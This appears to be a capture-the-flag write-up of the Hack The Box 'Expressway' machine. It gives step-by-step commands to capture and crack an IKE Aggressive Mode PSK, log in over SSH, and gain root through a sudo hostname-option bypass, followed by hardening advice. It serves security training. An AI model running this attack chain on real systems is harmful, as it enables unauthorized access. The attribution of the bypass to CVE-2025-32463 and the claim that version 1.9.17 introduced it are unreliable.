---
title: "Expressway: IKE Aggressive Mode to Sudo Hostname Bypass"
description: "IKE Aggressive Mode with PSK authentication exposes a crackable hash for SSH access, and a non-standard sudo binary is abused through a hostname-based policy bypass (CVE-2025-32463) to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - vpn
  - ike
  - privilege-escalation
  - credential-cracking
---

## Summary

This Hack The Box Linux lab demonstrates exploitation of an IKE VPN service configured with PSK authentication and Aggressive Mode, yielding offline PSK hash cracking and SSH access. Post-access enumeration revealed a non-standard `sudo` binary vulnerable to a hostname-based policy bypass (CVE-2025-32463); an internal hostname from Squid proxy logs triggered a permissive sudoers rule, granting root. Target IPs, credentials, and flags are replaced with placeholders.

## Context and Objective

The notes describe a Medium Linux machine with an IPsec/IKE VPN service as the primary attack surface. No web application was exposed. The objective was to identify VPN configuration weaknesses, obtain credentials through offline cracking, and escalate privileges on a system running a custom-compiled `sudo` binary.

## Approach and Evidence

### Discover the IKE service

**Observation.** A UDP port scan identified the IKE service on UDP 500 as the primary attack surface. TCP scanning revealed only SSH.

**Action.** The notes performed a UDP scan and then enumerated the IKE service:

```bash
sudo nmap -Pn -sU -sC -sV -oN nmap/<TARGET>-UDP <TARGET_IP>
```

```text
PORT    STATE SERVICE VERSION
500/udp open  isakmp  XAUTH, Dead Peer Detection
```

**Significance.** UDP scanning is critical when VPN services are present; TCP-only scans would have missed the primary attack vector entirely.

**Supported result.** IKE enumeration with `ike-scan` confirmed Aggressive Mode was active:

```bash
ike-scan -M <TARGET_IP>
```

```text
<TARGET_IP>  Aggressive Mode Handshake returned
    SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK)
    ID(Type=ID_USER_FQDN, Value=ike@<TARGET_DOMAIN>)
```

The `Auth=PSK` field confirms Pre-Shared Key authentication, and `Aggressive Mode` indicates the PSK hash is transmitted in recoverable form during the unencrypted handshake.

### Capture and crack the PSK hash

**Observation.** In IKE Aggressive Mode, the PSK hash is exposed in the initial handshake packets. The known peer identity string is required for hash capture.

**Action.** The notes captured the hash using the peer identity and converted it for offline cracking:

```bash
ike-scan -A <TARGET_IP> \
  --id=ike@<TARGET_DOMAIN> \
  --pskcrack=hash.txt

ikescan2john hash.txt > ike.hash
john ike.hash --wordlist=<WORDLIST_PATH>
```

**Significance.** Aggressive Mode transmits the PSK hash before an encrypted channel is established, enabling offline dictionary attacks against weak pre-shared keys.

**Supported result.** The recorded output shows the cracked PSK was found:

```text
<CRACKED_PSK>
```

### Establish SSH access

**Observation.** The cracked PSK corresponded to SSH credentials for the `<VPN_USER>` account.

**Action.** The notes used the recovered credentials for SSH authentication:

```bash
ssh <VPN_USER>@<TARGET_IP>
```

**Significance.** VPN credential reuse with SSH is a common misconfiguration in environments where the same PSK is used for both authentication contexts.

**Supported result.** The notes report obtaining a shell as the `<VPN_USER>` account and reading the user result from `<USER_RESULT_FILE>`.

### Enumerate privilege escalation vectors

**Observation.** The `sudo` binary at `/usr/local/bin/sudo` was a non-standard, custom-compiled installation running version 1.9.17. The `<VPN_USER>` account was a member of the `proxy` group, granting read access to Squid proxy logs.

**Action.** The notes performed local enumeration:

```bash
which sudo
# /usr/local/bin/sudo  ← non-standard path

sudo -V
# Sudo version 1.9.17

id
# uid=<USER_ID>(<VPN_USER>) gid=<GROUP_ID>(<VPN_USER>) groups=<GROUP_ID>(<VPN_USER>),13(proxy)
```

**Significance.** Non-standard binary paths bypass package-manager update processes. Version 1.9.17 introduced hostname-based policy evaluation via the `-h` flag, which is exploitable when the sudoers configuration contains hostname-specific rules.

**Supported result.** Proxy log access revealed an internal hostname:

```bash
cat /var/log/squid/access.log.1
```

```text
<TIMESTAMP>  <INTERNAL_IP>  TCP_DENIED/403  GET http://offramp.<TARGET_DOMAIN>
```

The log entry shows an internal client attempting to access `offramp.<TARGET_DOMAIN>`, exposing a hostname that may have a corresponding sudoers policy.

### Exploit CVE-2025-32463 — sudo hostname policy bypass

**Observation.** Sudo 1.9.17 evaluates policies based on a hostname specified via `-h`. If the target hostname has a more permissive sudoers rule, the current user's restrictions are bypassed.

**Action.** The notes applied the bypass using the hostname discovered in proxy logs:

```bash
/usr/local/bin/sudo -h offramp.<TARGET_DOMAIN> /usr/bin/bash
```

```text
root@<TARGET_HOST>:/# id
uid=0(root) gid=0(root) groups=0(root)
```

**Significance.** The `-h` flag causes sudo to look up the named hostname's sudoers policy instead of the current machine's. A permissive rule defined for `offramp.<TARGET_DOMAIN>` granted unrestricted root access when that hostname was supplied.

**Supported result.** The recorded output confirms root execution and the elevated result was obtained from `<ELEVATED_RESULT_FILE>`.

## Challenges and Decisions

The primary challenge was identifying the VPN service through UDP scanning — standard TCP-only approaches would have missed it entirely. The privilege escalation required correlating proxy log data with a version-specific sudo vulnerability, demonstrating that network log access can directly inform privilege escalation paths.

## Outcome

Recorded evidence establishes offline PSK hash capture through IKE Aggressive Mode, credential recovery via dictionary cracking, SSH access, and root privilege escalation through CVE-2025-32463 hostname policy bypass. The attack chain spans network-layer protocol weakness to local binary vulnerability, with proxy log intelligence bridging the two.

## Lessons and Recommendations

- Disable IKE Aggressive Mode on all VPN gateways. Use Main Mode with certificate-based authentication to eliminate PSK hash exposure. If PSK is required, use a minimum of 32 random characters.
- Keep security-critical binaries at distribution-provided versions. Custom-compiled `sudo` at `/usr/local/bin/sudo` bypasses package-manager patching. The non-standard path itself is a detection indicator.
- Restrict proxy log access. Logs may reveal internal hostnames and network topology. Proxy access should be limited to the service account and designated security personnel.
- Recommendations derive from the recorded access path; notes do not document remediation testing.

## References

- Hack The Box [Expressway](https://app.hackthebox.com/machines/Expressway) machine, based on independently curated lab notes.
